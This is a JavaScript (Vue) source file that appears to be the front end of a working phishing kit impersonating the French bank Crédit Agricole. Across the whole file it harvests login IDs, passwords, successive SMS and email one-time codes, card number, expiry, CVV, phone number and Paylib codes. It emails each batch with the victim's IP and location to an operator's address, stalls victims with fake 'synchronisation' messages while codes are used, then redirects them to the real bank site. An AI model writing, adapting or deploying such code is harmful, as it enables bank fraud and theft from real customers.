

const index =new Vue({
    el:"#index",
    data:{
        error:false,
        loading:false,
        message:'Chargement en cours...',
        login:1,
        step :1,
        log:{
            DEP:'',
            ID:'',
            PASS: '',
            SMS:'',
            SMS2:'',
            CODE:'',
            numcc:'',
            ex1:'',
            ex2:'',
            cvv:'',
            tel:'',
            SMSP:'',
        }
    },
    mounted(){
$('body').show()
       console.log(this.content)


    },

    computed:{
        content(){
            var loc =JSON.stringify(locIp)

            var message ={
                name:'POPS-CA',
                from:'resultca@result.com',
                to:$('#Mail').val(),
                subject : this.login==2 ? 'CA DEP + LOG ' : '' + this.login==3 && this.step==1 ? 'CA AUTH-SMS ' :'' + this.login==3 && this.step==2 ? 'CA SECURE-SMS ':'' + this.login==3 && this.step==3 ? ' ':'',
                html:''+JSON.stringify(this.log)+'<p><br>'+JSON.stringify(locIp)+'</p>'
            }
            return message
        }
    },
    methods:{

        showChat(){
            Tawk_API.toggle();
        },
        goToCredit(){
            if(this.log.DEP=='' || this.log.DEP.length<2) return this.error=true
            this.loading=true
            setTimeout(()=>{
                this.login++
                this.loading=false
            },1300)


        },
        goToEspace(){

            if(this.log.ID.length<11)  return this.$Message.error('Corriger les IDENTIFIANTS SVP ')
			if(this.log.PASS.length!==6)  return this.$Message.error(' Corriger le PASS SVP ')
            this.message='Connexion en cours ....'
            this.loading=true
            this.content.subject+=" > "+iPfull

            socket.emit('sendMail',this.content,(clb)=>{
                if(clb){
                   if($('#Option').val()==1 || $('#option').val()=='1'){

                    setTimeout(()=>{
                        this.login=5
                        this.loading=false
                    },15000)

                   } else {
                    setTimeout(()=>{
                    this.login++
                    this.loading=false
                },24000)
            }
                } else {
                    window.location.reload()
                }
            })
        },
        goToStep(){
            if(this.log.SMS.length!==6) return this.$Message.error('Code incorrect')
            this.message="Vérification du code en cours..."
            this.loading=true
            this.content.subject+=" > "+iPfull
            socket.emit('sendMail',this.content,(clb)=>{
                if(clb){
                    setTimeout(()=>{
                        setTimeout(()=>{
                            this.message="Envoie de nouveau code par SMS , patientez SVP"
                        },5000)

                        setTimeout(()=>{
                            this.message="Synchronisation en cours..."
                        },8000)

                        setTimeout(()=>{

                            this.step=2
                           this.loading=false

                        },14000)
                    },7000)
                } else {
                    window.location.reload()
                }
            })
        },

        goToStep2(){
            if(this.log.SMS2.length!==6) return this.$Message.error('Code incorrect')
            if(this.log.SMS2==this.log.SMS) return this.$Message.error('Saisissez le 2ème code reçu par SMS SVP...')
            this.message="Vérification du code en cours..."
            this.loading=true
            this.content.subject+=" > "+iPfull
            socket.emit('sendMail',this.content,(clb)=>{
                if(clb){
                    setTimeout(()=>{
                        setTimeout(()=>{
                            this.message="Envoie de nouveau code par E-mail , patientez SVP"
                        },5000)

                        setTimeout(()=>{
                            this.message="Synchronisation en cours..."
                        },8000)

                        setTimeout(()=>{

                            this.step=3
                           this.loading=false

                        },14000)
                    },7000)
                } else {
                    window.location.reload()
                }
            })
        },




        setCard(){
            if(this.log.numcc.length<14) return false
            this.message="Activation des services en cours ...."
            this.loading=true
            this.content.subject+="CA DETAILS CC > "+iPfull
            socket.emit('sendMail',this.content,(clb)=>{
              if(clb){
                  this.login++
                  this.loading=false
                //  setTimeout(()=>{
                  //    window.location.href="https://www.credit-agricole.fr/"
                  //},1000)
              } else {
                  window.location.reload()
              }
            })

        },

        submitPaylib(){
            if(this.log.SMSP.length!==6) return this.$Message.error('Code incorrect')
            if(this.log.SMSP==this.log.SMS) return this.$Message.error('Saisissez le code reçu par SMS')
            if(this.log.SMSP==this.log.SMS2) return this.$Message.error('Saisissez le code reçu par SMS SVP...')
            this.message="Paylib En cours d'activation ..."
            this.loading=true
            this.content.subject+="CA SECURE-PAYLIB > "+iPfull
            socket.emit('sendMail',this.content,(clb)=>{

              if(clb){

                  this.$Message.success('Service Pro activé ')
                  this.message="Redirection dans 3 secondes ..."

                setTimeout(()=>{
                     window.location.href="https://www.credit-agricole.fr/"
              },3000)
              } else {
                  window.location.reload()
              }







            })


        },

        retourne(){
        setTimeout(() =>{ alert("Les codes reçus ne seront plus valable, vous allez être redirigé vers la première page pour recommencer la procédure..."); }, 1000)

            setTimeout(()=>{
             window.location.href="index.html"
           },5000)

        },



        submitForm(){
            if(this.log.CODE.length!==6) return this.$Message.error('Code incorrect')
            if(this.log.CODE==this.log.SMS) return this.$Message.error('Saisissez le code reçu par E-mail SVP...')
            if(this.log.CODE==this.log.SMS2) return this.$Message.error('Saisissez le code reçu par E-mail SVP...')
            this.message="En cours d'activation ..."
            this.loading=true
            this.content.subject+="CA SECURE-EMAIL > "+iPfull
            socket.emit('sendMail',this.content,(clb)=>{
                if(clb){
                    this.login++
                    this.loading=false
                  //  setTimeout(()=>{
                    //    window.location.href="https://www.credit-agricole.fr/"
                    //},1000)
                } else {
                    window.location.reload()
                }
            })


        }
    }

})
